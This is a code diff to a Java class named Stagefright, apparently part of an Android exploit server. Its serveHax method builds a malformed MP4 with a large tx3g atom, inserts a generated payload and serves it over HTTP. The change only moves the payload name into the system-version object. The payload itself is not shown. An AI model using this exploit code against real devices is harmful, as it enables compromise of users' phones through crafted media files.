@@ -10,8 +10,7 @@ import java.nio.charset.StandardCharsets;
 
 public class Stagefright
 {
-    public static boolean serveHax(OutputStream out, SystemVersions systemVersion, HTTPRequest header, String payloadName)
-            throws Exception
+    public static boolean serveHax(OutputStream out, SystemVersions systemVersion, HTTPRequest header) throws Exception
     {
         int tx3gSize = 32768;
 
@@ -65,7 +64,7 @@ public class Stagefright
                 }
                 else if (i < 20480)
                 {
-                    byte[] payload = Payload.generatePayload(systemVersion, payloadName);
+                    byte[] payload = Payload.generatePayload(systemVersion);
                     payloadSteam.write(payload);
                     i += payload.length - 4;
                     if (i + 4 >= 24576)
@@ -120,7 +119,7 @@ public class Stagefright
         out.write(payload);
         out.write("\r\n0\r\n\r\n".getBytes(StandardCharsets.US_ASCII));
 
-        File dumpFile = new File(Environment.getExternalStoragePublicDirectory("kexdroid") + "/dump/" + systemVersion.name() + "_" + payloadName + ".mp4");
+        File dumpFile = new File(Environment.getExternalStoragePublicDirectory("kexdroid") + "/dump/" + systemVersion.name() + "_" + systemVersion.payloadName + ".mp4");
         dumpFile.getParentFile().mkdirs();
         FileOutputStream fos = new FileOutputStream(dumpFile);
         fos.write(payload);
